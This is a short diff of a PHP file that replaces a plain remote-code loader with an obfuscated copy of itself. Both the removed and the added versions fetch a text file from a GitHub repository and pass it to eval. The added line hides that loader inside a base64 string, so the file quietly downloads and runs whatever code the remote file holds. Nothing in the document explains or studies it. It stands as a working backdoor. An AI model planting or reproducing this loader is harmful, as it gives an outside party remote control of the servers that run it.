@@ -1,9 +1,1 @@
-<?php 
-$link = 'https://raw.githubusercontent.com/dasisqo/cmd/main/azusa2.txt';
-$ch = curl_init(); 
-curl_setopt($ch, CURLOPT_URL, $link);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-$output = curl_exec($ch); 
-curl_close($ch);      
-eval ('?>'.$output);
-?>
+<?=eval("?>".base64_decode("PD9waHAgCiRsaW5rID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kYXNpc3FvL2NtZC9tYWluL2F6dXNhMi50eHQnOwokY2ggPSBjdXJsX2luaXQoKTsgCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICRsaW5rKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgCiRvdXRwdXQgPSBjdXJsX2V4ZWMoJGNoKTsgCmN1cmxfY2xvc2UoJGNoKTsgICAgICAKZXZhbCAoJz8+Jy4kb3V0cHV0KTsKPz4="));?>
